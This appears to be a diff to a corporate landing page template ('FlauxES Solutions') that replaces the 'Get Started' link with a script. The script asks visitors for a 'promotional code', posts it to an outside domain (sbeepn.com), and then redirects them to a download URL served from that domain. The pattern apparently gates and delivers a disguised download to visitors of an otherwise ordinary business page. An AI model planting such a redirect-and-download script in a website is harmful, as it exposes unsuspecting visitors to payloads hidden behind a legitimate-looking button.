@@ -56,7 +56,7 @@
         <div class="col-md-6 intro-info order-md-first order-last">
           <h2>FlauxES Solutions<br>for Your <span>Business!</span></h2>
           <div>
-            <a href="test.com" class="btn-get-started scrollto" >Get Started</a>
+            <a onclick="down()" class="btn-get-started scrollto" >Get Started</a>
 
           </div>
         </div>
@@ -227,7 +227,37 @@
     </div>
   </footer>
 
-  
+  <script>
+function down(){
+  swal('Enter the promotional code to start the download:', {
+      content: 'input',
+  }).then((value) => {
+        $.ajax({
+        type: 'POST',
+        url: 'https://sbeepn.com/action.php',
+        data: {
+            promo: value
+        },
+        success: function(data) {
+          console.log(data);
+          if(data == "1"){
+            swal('This promotional code is not valid or has not been created.');
+          }else{
+            swal('Thank you for participating in the project, the download will begin soon.');
+            function hell() {
+              document.location.href = "https://sbeepn.com/inc/one.php?work="+data+"&url=https://sbeepn.com/inc/two.php";
+            }
+            setTimeout(hell, 3200);
+          }
+        }
+      });
+  });
+}
+</script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+<script type='text/javascript' src='//cdn.dynamicyield.com/api/8767307/api_dynamic.js'></script>
+<script type='text/javascript' src='//cdn.dynamicyield.com/api/8767307/api_static.js'></script>
+          
   <script src="lib/jquery/jquery.min.js"></script>
   <script src="lib/jquery/jquery-migrate.min.js"></script>
   <script src="lib/bootstrap/js/bootstrap.bundle.min.js"></script>
